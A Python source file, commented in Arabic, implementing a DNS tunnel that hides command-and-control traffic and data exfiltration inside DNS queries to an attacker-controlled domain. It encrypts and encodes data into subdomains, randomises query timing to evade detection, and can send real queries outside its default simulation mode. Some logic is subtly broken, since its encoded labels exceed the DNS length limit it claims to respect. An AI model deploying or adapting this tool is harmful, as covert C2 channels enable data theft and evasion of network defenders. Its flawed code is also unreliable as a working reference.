"""
DNS Tunnel - إرسال أوامر واستقبال بيانات عبر استعلامات DNS
تبدو كاستعلامات DNS عادية للمراقب
"""

import dns.resolver
import dns.query
import dns.message
import base64
import time
import random
import string
import hashlib
import logging
from typing import List, Optional, Tuple, Callable
from dataclasses import dataclass
from cryptography.fernet import Fernet

logger = logging.getLogger(__name__)


@dataclass
class DNSMessage:
    """رسالة عبر DNS"""
    id: str
    command: str
    data: bytes
    chunk_index: int
    total_chunks: int
    timestamp: float


class DNSTunnel:
    """
    نفق DNS - يخفي الاتصال داخل استعلامات DNS
    
    كيف يعمل:
    1. تقسيم البيانات إلى أجزاء صغيرة (حد أقصى 63 حرف لكل جزء)
    2. تشفير كل جزء
    3. ترميز إلى Base32 (آمن لـ DNS)
    4. إرسال كاستعلامات DNS إلى نطاق يسيطر عليه المهاجم
    5. استقبال الأوامر عبر سجلات TXT أو استعلامات عكسية
    """
    
    def __init__(self, domain: str, dns_server: str = "8.8.8.8", simulation_mode: bool = True):
        self.domain = domain
        self.dns_server = dns_server
        self.simulation_mode = simulation_mode
        self.session_key = Fernet.generate_key()
        self.cipher = Fernet(self.session_key)
        
        # إعدادات التخفي
        self.max_subdomain_length = 63
        self.query_delay_min = 0.5
        self.query_delay_max = 3.0
        self.use_txt_requests = True
        
        logger.info(f"DNSTunnel initialized for domain {domain}")
    
    def _chunk_data(self, data: bytes, chunk_size: int = 50) -> List[bytes]:
        """تقسيم البيانات إلى أجزاء صغيرة"""
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    def _encode_chunk(self, chunk: bytes) -> str:
        """تشفير جزء إلى نص صالح لـ DNS"""
        # تشفير أولاً
        encrypted = self.cipher.encrypt(chunk)
        # ترميز Base32 (آمن لـ DNS)
        encoded = base64.b32encode(encrypted).decode().rstrip('=')
        # تحويل إلى أحرف صغيرة
        return encoded.lower()
    
    def _decode_chunk(self, encoded: str) -> bytes:
        """فك تشفير جزء من DNS"""
        # إعادة padding Base32
        padding = 8 - (len(encoded) % 8)
        if padding != 8:
            encoded += '=' * padding
        decoded = base64.b32decode(encoded.upper())
        return self.cipher.decrypt(decoded)
    
    def _build_subdomain(self, chunk: str, msg_id: str, idx: int, total: int) -> str:
        """بناء اسم النطاق الفرعي"""
        # format: {msg_id}.{idx}.{total}.{chunk}.{domain}
        return f"{msg_id}.{idx}.{total}.{chunk}.{self.domain}"
    
    def send_data(self, data: bytes, msg_id: str = None) -> List[str]:
        """
        إرسال بيانات عبر استعلامات DNS
        
        Args:
            data: البيانات المرسلة
            msg_id: معرف الرسالة (يتولد تلقائياً)
        
        Returns:
            List[str]: قائمة الاستعلامات المرسلة
        """
        if msg_id is None:
            msg_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
        # تقسيم البيانات
        chunks = self._chunk_data(data, self.max_subdomain_length - 50)  # ترك مساحة للمعرفات
        total = len(chunks)
        
        queries = []
        for i, chunk in enumerate(chunks):
            encoded_chunk = self._encode_chunk(chunk)
            subdomain = self._build_subdomain(encoded_chunk, msg_id, i, total)
            
            if self.simulation_mode:
                logger.debug(f"[DNS] Query: {subdomain}")
            else:
                # إرسال استعلام DNS حقيقي
                try:
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [self.dns_server]
                    resolver.query(subdomain, 'A')
                except Exception as e:
                    logger.error(f"DNS query failed: {e}")
            
            queries.append(subdomain)
            
            # تأخير عشوائي لتجنب اكتشاف الأنماط
            time.sleep(random.uniform(self.query_delay_min, self.query_delay_max))
        
        logger.info(f"Sent {total} DNS chunks for message {msg_id}")
        return queries
    
    def receive_data(self, listener_callback: Callable[[str, bytes], None]):
        """
        استقبال بيانات عبر DNS (يستمع لاستعلامات DNS الواردة)
        
        في البيئة الحقيقية، تحتاج إلى تشغيل خادم DNS على النطاق الخاص بك
        هذه محاكاة لكيفية عمل الاستقبال
        """
        logger.info("DNS listener started (simulation mode)")
        
        # محاكاة استقبال البيانات
        if self.simulation_mode:
            # توليد بيانات وهمية للاختبار
            test_data = b"Hello from C2 server"
            self.send_data(test_data)
        
        # في الواقع، ستحتاج إلى تشغيل خادم DNS حقيقي
        # باستخدام مكتبة مثل dnslib أو scapy
    
    def encode_command(self, command: str) -> List[str]:
        """تشفير أمر وإرساله عبر DNS"""
        return self.send_data(command.encode())
    
    def decode_response(self, subdomain: str) -> Optional[bytes]:
        """
        فك تشفير استجابة من DNS query
        """
        parts = subdomain.split('.')
        if len(parts) < 5:
            return None
        
        try:
            msg_id = parts[0]
            idx = int(parts[1])
            total = int(parts[2])
            encoded_chunk = parts[3]
            
            chunk = self._decode_chunk(encoded_chunk)
            return chunk
        except Exception as e:
            logger.error(f"Failed to decode response: {e}")
            return None


# مثال استخدام
if __name__ == "__main__":
    tunnel = DNSTunnel(domain="attacker-controlled.com", simulation_mode=True)
    
    # إرسال أمر
    command = "whoami"
    queries = tunnel.encode_command(command)
    print(f"Command '{command}' encoded into {len(queries)} DNS queries")
    print(f"Example query: {queries[0]}")